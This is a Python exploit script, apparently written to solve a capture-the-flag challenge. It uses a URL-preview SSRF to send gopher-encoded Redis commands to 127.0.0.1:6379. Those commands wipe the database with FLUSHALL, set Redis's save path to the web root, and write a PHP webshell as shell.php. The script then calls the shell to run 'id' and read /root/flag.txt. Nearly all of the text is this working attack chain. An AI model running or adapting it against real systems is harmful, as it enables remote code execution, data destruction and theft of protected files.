import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

# Build RESP protocol commands
php_payload = '\n\n<?php system($_GET["c"]); ?>\n\n'
payload_len = len(php_payload)

resp_cmds = ""
# FLUSHALL
resp_cmds += "*1\r\n$8\r\nFLUSHALL\r\n"
# CONFIG SET dir /var/www/html/
resp_cmds += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/www/html/\r\n"
# CONFIG SET dbfilename shell.php
resp_cmds += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n"
# SET webshell <php_payload>
resp_cmds += f"*3\r\n$3\r\nSET\r\n$8\r\nwebshell\r\n${payload_len}\r\n{php_payload}\r\n"
# SAVE
resp_cmds += "*1\r\n$4\r\nSAVE\r\n"
# QUIT
resp_cmds += "*1\r\n$4\r\nQUIT\r\n"

# URL-encode for gopher
encoded = urllib.parse.quote(resp_cmds)
gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"

print("=== Writing webshell via RESP ===")
result = fetch(gopher_url, timeout=10)
print(result)
print()

# Now test the webshell via SSRF
print("=== Testing webshell: id ===")
print(fetch('http://127.0.0.1/shell.php?c=id'))
print()

print("=== Testing webshell: cat /root/flag.txt ===")
print(fetch('http://127.0.0.1/shell.php?c=cat+/root/flag.txt'))
